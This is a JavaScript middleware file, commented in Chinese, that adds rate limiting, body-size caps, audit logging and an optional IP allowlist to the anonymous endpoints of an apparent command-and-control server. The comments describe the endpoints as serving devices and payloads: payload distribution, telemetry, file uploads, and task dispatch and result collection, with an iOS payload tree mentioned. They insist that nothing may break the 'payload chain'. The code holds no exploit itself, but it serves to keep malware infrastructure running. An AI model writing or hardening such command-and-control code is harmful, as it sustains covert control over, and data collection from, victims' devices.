// ============================================================================
// C2 控制面·设备侧防护层（T23 / 审核 C 的 C-13）
// ============================================================================
// 背景：`plugins/c2/*` 与 `plugins/collector/*` 是 `apiPlugin` 的【兄弟插件】，
//       不继承 authMiddleware ⇒ 其 12 个端点【匿名可达】（审核 C 实测 200）。
//
// ★ 为何【不能】直接套 authMiddleware：
//   这些端点是【给设备/载荷调的】（/vhx 存活探测、/details/* 载荷分发、
//   /t 遥测、/u 上传…），而【载荷侧没有任何凭证机制】
//   （实测：05-ios 全树搜 x-ts / AES_KEY_PREFIX / 加密调用 ⇒ 零命中）。
//   ⇒ 套鉴权会【直接打断载荷链】。
//
// ★ 故本层做【不改载荷】的防护：
//   ① IP 限频（令牌桶，按端点分级）
//   ② body 大小限制（按端点分级）
//   ③ 高风险端点的审计日志
//   ④ 可选 IP 白名单（环境变量 C2_ALLOWED_IPS，默认不限制）
//
// ★ 本层【不要求凭证】—— 铁律：不得打断载荷链。
// ============================================================================

import { logger } from '../../core/logger/index.js';
import { getRealIP } from '../../core/utils/ip.js';

// ---- 配置 ----------------------------------------------------------------

/** ★ 按端点分级的限频（次/分钟）。更小 = 更严。 */
const RATE_LIMITS = {
    '/vhx': 120,
    '/details/show.html': 120,
    '/t': 120,
    '/event': 60,
    '/a': 60,
    '/u': 30,
    // ★ 高风险端点：更严
    '/taskget': 10,
    '/taskresult': 10,
    '/api/ip-sync/sync': 30,
    '/api/tg/t': 30,
    '/api/wp/t': 30,
};
const RATE_DEFAULT = 60;

/** ★ 按端点分级的 body 大小上限（字节）。 */
const BODY_LIMITS = {
    '/t': 64 * 1024,
    '/event': 64 * 1024,
    '/u': 8 * 1024 * 1024,
    '/a': 256 * 1024,
    '/details/show.html': 64 * 1024,
    '/taskget': 256 * 1024,
    '/taskresult': 1 * 1024 * 1024,   // ★ 结果回传，给 1MB
    '/api/ip-sync/sync': 256 * 1024,
    '/api/tg/t': 256 * 1024,
    '/api/wp/t': 256 * 1024,
};
const BODY_DEFAULT = 256 * 1024;

/** ★ 高风险端点：记录审计日志。 */
const AUDIT_PATHS = new Set(['/taskget', '/taskresult', '/api/ip-sync/sync']);

const WINDOW_MS = 60 * 1000;

// ---- 可选 IP 白名单 --------------------------------------------------------

const ALLOWED_IPS = (process.env.C2_ALLOWED_IPS || '')
    .split(',')
    .map((s) => s.trim())
    .filter(Boolean);

// ---- 令牌桶（内存态，按 IP + 端点）----------------------------------------

/** Map<`${ip}|${path}`, { count, windowStart }> */
const buckets = new Map();

function rateExceeded(ip, path) {
    const limit = RATE_LIMITS[path] ?? RATE_DEFAULT;
    const key = `${ip}|${path}`;
    const now = Date.now();
    let b = buckets.get(key);
    if (!b || now - b.windowStart >= WINDOW_MS) {
        b = { count: 0, windowStart: now };
        buckets.set(key, b);
    }
    b.count += 1;
    return b.count > limit;
}

/** ★ 防止 buckets 无界增长：定期清理过期窗口。 */
let _sweeperStarted = false;
function startSweeper() {
    if (_sweeperStarted) return;
    _sweeperStarted = true;
    const t = setInterval(() => {
        const now = Date.now();
        for (const [k, b] of buckets) {
            if (now - b.windowStart >= WINDOW_MS * 2) buckets.delete(k);
        }
    }, WINDOW_MS);
    if (typeof t.unref === 'function') t.unref();   // 不阻塞进程退出
}

// ---- 主体 ------------------------------------------------------------------

/**
 * ★ C2 设备侧防护 preHandler。
 *   ★ 只做限频 / body 限制 / 审计 / 可选白名单；【不要求凭证】。
 */
export async function c2Guard(request, reply) {
    const path = request.url.split('?')[0];
    const ip = getRealIP(request);

    // ① 可选 IP 白名单
    if (ALLOWED_IPS.length > 0 && !ALLOWED_IPS.includes(ip)) {
        logger.warn({ ip, path }, 'c2-guard: ip not in allowlist');
        reply.code(403).send({ error: 'forbidden' });
        return;
    }

    // ② 限频（★ 用 Content-Length 之前先判，避免大 body 先被读）
    if (rateExceeded(ip, path)) {
        logger.warn({ ip, path, limit: RATE_LIMITS[path] ?? RATE_DEFAULT },
            'c2-guard: rate limit exceeded');
        reply.code(429).send({ error: 'too many requests' });
        return;
    }

    // ③ body 大小（按 Content-Length 预判；分块传输由 Fastify bodyLimit 兜底）
    const limit = BODY_LIMITS[path] ?? BODY_DEFAULT;
    const cl = parseInt(request.headers['content-length'] || '0', 10);
    if (Number.isFinite(cl) && cl > limit) {
        logger.warn({ ip, path, contentLength: cl, limit }, 'c2-guard: body too large');
        reply.code(413).send({ error: 'payload too large' });
        return;
    }

    // ④ 高风险端点审计
    if (AUDIT_PATHS.has(path)) {
        logger.info({
            ip, path, method: request.method, contentLength: cl,
            deviceId: request.deviceId || '', channelCode: request.channelCode || '',
        }, 'c2-guard: high-risk endpoint access');
    }
}

/** ★ 供 index.js 注册。 */
export function installC2Guard(fastify) {
    startSweeper();
    fastify.addHook('preHandler', c2Guard);
}

/** ★ 供判据/测试读取当前配置（只读，不影响行为）。 */
export function getC2GuardConfig() {
    return {
        rateLimits: { ...RATE_LIMITS, __default: RATE_DEFAULT },
        bodyLimits: { ...BODY_LIMITS, __default: BODY_DEFAULT },
        auditPaths: [...AUDIT_PATHS],
        allowedIps: [...ALLOWED_IPS],
        allowlistEnabled: ALLOWED_IPS.length > 0,
    };
}
